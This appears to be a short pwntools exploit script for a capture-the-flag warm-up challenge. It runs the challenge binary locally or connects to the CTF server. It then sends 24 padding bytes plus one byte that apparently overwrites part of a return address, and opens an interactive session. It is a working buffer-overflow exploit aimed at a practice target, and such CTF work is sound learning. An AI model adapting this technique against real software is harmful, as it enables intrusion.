from pwn import *
context(terminal=['tmux','new-window'])


local = debug = True
fname = './chal'
host,port = 'warmup1.ctf.maplebacon.org',1337

r = process(fname) if local else remote(host,port)


def exploit():
	if debug: gdb.attach(r,'')
	r.send(b'a'*24+b'\x19')



if __name__=='__main__':
	exploit()	
	r.interactive()





